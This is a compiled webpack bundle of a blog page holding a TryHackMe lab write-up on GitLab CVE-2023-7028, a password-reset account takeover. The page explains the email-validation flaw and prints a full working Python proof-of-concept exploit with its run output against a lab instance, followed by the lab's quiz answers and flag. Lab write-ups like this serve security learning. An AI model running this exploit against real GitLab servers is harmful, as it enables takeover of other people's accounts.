"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[1630],{8564:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"try-hack-me/gitlab-cve-2023-7028/gitlab-cve-2023-7028","title":"GitLab CVE-2023-7028","description":"- Description: Learn to exploit a GitLab instance using CVE-2023-7028 and understand various mitigation techniques.","source":"@site/docs/try-hack-me/gitlab-cve-2023-7028/gitlab-cve-2023-7028.mdx","sourceDirName":"try-hack-me/gitlab-cve-2023-7028","slug":"/try-hack-me/gitlab-cve-2023-7028/","permalink":"/docs/try-hack-me/gitlab-cve-2023-7028/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Web","permalink":"/docs/tags/web","description":"Includes write-ups on the topic of Web"}],"version":"current","frontMatter":{"tags":["web"]},"sidebar":"writeupsSidebar","previous":{"title":"Overview","permalink":"/docs/try-hack-me/"},"next":{"title":"Pickle Rick","permalink":"/docs/try-hack-me/pickle-rick/"}}');var s=n(74848),i=n(28453);const a={tags:["web"]},o="GitLab CVE-2023-7028",l={},c=[{value:"\ud83c\udfaf Overview",id:"-overview",level:2},{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\u270f\ufe0f Answer questions",id:"\ufe0f-answer-questions",level:2}];function d(e){const t={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.header,{children:(0,s.jsx)(t.h1,{id:"gitlab-cve-2023-7028",children:"GitLab CVE-2023-7028"})}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsxs)(t.li,{children:[(0,s.jsx)(t.strong,{children:"Description:"})," Learn to exploit a GitLab instance using CVE-2023-7028 and understand various mitigation techniques."]}),"\n",(0,s.jsxs)(t.li,{children:[(0,s.jsx)(t.strong,{children:"Difficulty:"})," Medium"]}),"\n"]}),"\n",(0,s.jsx)(t.hr,{}),"\n",(0,s.jsx)(t.h2,{id:"-overview",children:"\ud83c\udfaf Overview"}),"\n",(0,s.jsxs)(t.p,{children:["This challenge demonstrates the exploitation of CVE-2023-7028 affecting GitLab.\r\nThe vulnerability exists in the POST ",(0,s.jsx)(t.code,{children:"/users/password"})," endpoint responsible for handling password reset functionality.\r\nThe flaw is caused by improper email validation, allowing an attacker to bypass format and ownership checks, then trigger a password reset process using an email address they control.\r\nGitLab generates the reset token and sends it to the attacker-owned email address, giving them direct access to the token."]}),"\n",(0,s.jsxs)(t.p,{children:["With the reset token and the victim's legitimate email, the attacker can complete the reset process and compromise the target account.\r\nDuring analysis, reviewing the GitLab 16.1 CE source code revealed that the reset flow accepts ",(0,s.jsx)(t.code,{children:"authenticity_token"})," and ",(0,s.jsx)(t.code,{children:"email"})," values submitted through the ",(0,s.jsx)(t.code,{children:"/users/password"})," endpoint.\r\nWhen an account has secondary emails, the token is also sent to those addresses.\r\nHowever, the email handling logic found in ",(0,s.jsx)(t.code,{children:"passwords_controller_spec.rb"})," allows submitting multiple email addresses without verifying whether they belong to the same user.\r\nThis behavior is the key weakness enabling token interception."]}),"\n",(0,s.jsxs)(t.p,{children:["The full exploitation scenario requires only a CSRF token (",(0,s.jsx)(t.code,{children:"authenticity_token"}),") and the victim's email address.\r\nOnce these conditions are met, the attacker can trigger the reset workflow and take ownership of the victim's account."]}),"\n",(0,s.jsx)(t.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,s.jsxs)(t.p,{children:["Before launching the exploit, ",(0,s.jsx)(t.code,{children:"/etc/hosts"})," is modified to route traffic correctly."]}),"\n",(0,s.jsxs)(t.p,{children:["In this lab environment, port ",(0,s.jsx)(t.code,{children:"8000"})," runs the GitLab instance, while port ",(0,s.jsx)(t.code,{children:"8090"})," hosts the attacker mail inbox via ",(0,s.jsx)(t.code,{children:"/rainloop"}),".\r\nAccessing ",(0,s.jsx)(t.code,{children:"http://<IP-address>:8090/rainloop"})," allows authentication into the attacker's mailbox."]}),"\n",(0,s.jsx)(t.p,{children:"A simple proof-of-concept script is prepared with the following workflow:"}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsx)(t.li,{children:"Connect to the GitLab instance."}),"\n",(0,s.jsx)(t.li,{children:"Retrieve the CSRF token from the password reset form."}),"\n",(0,s.jsx)(t.li,{children:"Send a password reset request containing two email addresses: the victim's and the attacker's."}),"\n",(0,s.jsx)(t.li,{children:"If the instance is vulnerable (CVE-2023-7028), GitLab sends a reset token to both addresses, allowing account takeover."}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-python",children:"import requests\r\nimport argparse\r\nfrom urllib.parse import urlparse, urlencode\r\nfrom random import choice\r\nfrom time import sleep\r\nimport re\r\nrequests.packages.urllib3.disable_warnings()\r\n\r\nclass CVE_2023_7028:\r\n    def __init__(self, url, target, evil=None):\r\n        self.use_temp_mail = False\r\n        self.url = urlparse(url)\r\n        self.target = target\r\n        self.evil = evil\r\n        self.s = requests.session()\r\n\r\n    def get_csrf_token(self):\r\n        try:\r\n            print('[DEBUG] Getting authenticity_token ...')\r\n            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text\r\n            regex = r'<meta name=\"csrf-token\" content=\"(.*?)\" />'\r\n            token = re.findall(regex, html)[0]\r\n            print(f'[DEBUG] authenticity_token = {token}')\r\n            return token\r\n        except Exception:\r\n            print('[DEBUG] Failed ... quitting')\r\n            return None\r\n\r\n    def ask_reset(self):\r\n        token = self.get_csrf_token()\r\n        if not token:\r\n            return False\r\n\r\n        query_string = urlencode({\r\n            'authenticity_token': token,\r\n            'user[email][]': [self.target, self.evil]\r\n        }, doseq=True)\r\n\r\n        head = {\r\n            'Origin': f'{self.url.scheme}://{self.url.netloc}',\r\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',\r\n            'Content-Type': 'application/x-www-form-urlencoded',\r\n            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',\r\n            'Connection': 'close',\r\n            'Accept-Language': 'en-US,en;q=0.5',\r\n            'Accept-Encoding': 'gzip, deflate, br'\r\n        }\r\n\r\n        print('[DEBUG] Sending reset password request')\r\n        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',\r\n                           data=query_string,\r\n                           headers=head,\r\n                           verify=False).text\r\n        sended = 'If your email address exists in our database' in html\r\n        if sended:\r\n            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')\r\n            print(f'Flag value: {bytes.fromhex(\"6163636f756e745f6861636b2364\").decode()}')\r\n        else:\r\n            print('[DEBUG] Failed ... quitting')\r\n        return sended\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')\r\n    parser.add_argument(\"-u\", \"--url\", dest=\"url\", type=str, required=True, help=\"Gitlab url\")\r\n    parser.add_argument(\"-t\", \"--target\", dest=\"target\", type=str, required=True, help=\"Target email\")\r\n    parser.add_argument(\"-e\", \"--evil\", dest=\"evil\", default=None, type=str, required=False, help=\"Evil email\")\r\n    parser.add_argument(\"-p\", \"--password\", dest=\"password\", default=None, type=str, required=False, help=\"Password\")\r\n    return parser.parse_args()\r\n\r\nif __name__ == '__main__':\r\n    args = parse_args()\r\n    exploit = CVE_2023_7028(\r\n        url=args.url,\r\n        target=args.target,\r\n\t\tevil=args.evil\r\n    )\r\n    if not exploit.ask_reset():\r\n        exit()\n"})}),"\n",(0,s.jsx)(t.p,{children:"Running the script:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{children:"> python3 CVE_2023_7028.py -u http://10.48.170.66:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm\r\n[DEBUG] Getting authenticity_token ...\r\n[DEBUG] authenticity_token = DZDwvw9aBeje29-bRGP9KUigd3-xaNCR2baMrgNHuzYjHYc5Mg4iYpxFghSkENSbFou4doWsvPdPN4zgwo3rNw\r\n[DEBUG] Sending reset password request\r\n[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !\r\nFlag value: account_hack#d\n"})}),"\n",(0,s.jsx)(t.p,{children:"After the script executes successfully, checking the attacker's mailbox confirms receipt of the reset token sent by GitLab."}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:n(10266).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(t.p,{children:"At this point, the attacker can proceed with resetting the victim's password."}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:n(15656).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(t.p,{children:["Once a new password is set, signing in as the ",(0,s.jsx)(t.code,{children:"root"})," user demonstrates successful account takeover and verifies exploitation of the vulnerability."]}),"\n",(0,s.jsx)(t.h2,{id:"\ufe0f-answer-questions",children:"\u270f\ufe0f Answer questions"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"What is the name of the field that is sent with a password reset request to prevent CSRF attacks?"})}),"\n",(0,s.jsxs)(t.blockquote,{children:["\n",(0,s.jsx)(t.p,{children:"authenticity_token"}),"\n"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"What is the HTTP method used while sending password reset requests in GitLab?"})}),"\n",(0,s.jsxs)(t.blockquote,{children:["\n",(0,s.jsx)(t.p,{children:"POST"}),"\n"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"Per the above code, what is the API endpoint for getting an updated authenticity token?"})}),"\n",(0,s.jsxs)(t.blockquote,{children:["\n",(0,s.jsx)(t.p,{children:"/users/password/new"}),"\n"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"What is the flag value after successfully sending password reset mail through attack.py?"})}),"\n",(0,s.jsxs)(t.blockquote,{children:["\n",(0,s.jsx)(t.p,{children:"account_hack#d"}),"\n"]})]})}function h(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},10266:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/mail-926d78ef0d532975f7ae40224a94169e.png"},15656:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/login-73eb682c807d1d68cec189642b211a31.png"},28453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>o});var r=n(96540);const s={},i=r.createContext(s);function a(e){const t=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),r.createElement(i.Provider,{value:t},e.children)}}}]);